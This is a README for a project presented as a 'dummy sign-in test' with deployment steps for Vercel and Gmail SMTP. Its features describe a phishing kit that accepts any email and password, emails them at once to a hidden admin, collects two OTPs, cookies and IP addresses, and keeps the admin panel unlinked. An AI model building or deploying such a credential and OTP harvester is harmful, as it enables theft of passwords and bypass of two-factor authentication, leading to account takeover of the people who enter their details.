# Dummy Sign-In Test (with real random OTP via Nodemailer)

Multi-step dummy authentication that generates **random 6-digit OTPs** and sends them to the user’s email using **Nodemailer + Gmail SMTP**.

## Features
- Email + Password (any value accepted) → immediately emailed to admin + OTP 1 generated & sent to user
- Username + Confirm Password (must match the first password)
- OTP 1 & OTP 2 (random, sent to user’s email)
- Admin receives every step in plain text (Cookies, IP, Timestamp, OTPs…)
- Password field has 👁️ show/hide toggle
- **Admin panel is hidden** at `/admin`

## URLs after deploying to Vercel

| Page            | URL                                      |
|-----------------|------------------------------------------|
| User login flow | `https://your-vercel-url.vercel.app/`    |
| **Admin panel** | `https://your-vercel-url.vercel.app/admin` |

The admin panel is **not linked** anywhere on the user page.

## Local Setup

### 1. Create a Google App Password
1. Google Account → Security → 2-Step Verification → App passwords
2. Create one for “Mail” and copy the 16-character password

### 2. Environment variables
```bash
cp .env.example .env
```

```env
GMAIL_USER=blessedresult6@gmail.com
GMAIL_APP_PASSWORD=your_16_char_app_password_here
ADMIN_PASSWORD=admin123
PORT=3000
```

### 3. Run locally
```bash
npm install
npm start
```

- User: http://localhost:3000/
- Admin: http://localhost:3000/admin

## Deploy to Vercel

1. Push this repo to GitHub (already done)
2. Go to [vercel.com](https://vercel.com) → New Project → Import this repository
3. **Add Environment Variables** in Vercel project settings:
   - `GMAIL_USER` = `blessedresult6@gmail.com`
   - `GMAIL_APP_PASSWORD` = your 16-character Google App Password
   - `ADMIN_PASSWORD` = `admin123` (or whatever you want)
4. Deploy

After deployment your admin panel will be at:

**`https://your-project-name.vercel.app/admin`**

## Admin login
- Email: `blessedresult6@gmail.com`
- Password: whatever you set in `ADMIN_PASSWORD`

## Important
- Never commit the real `.env` file
- On Vercel the in-memory sessions reset when the serverless function goes cold (normal for a dummy test)

Repo: https://github.com/Dennisbed1234/dummy-signin-test
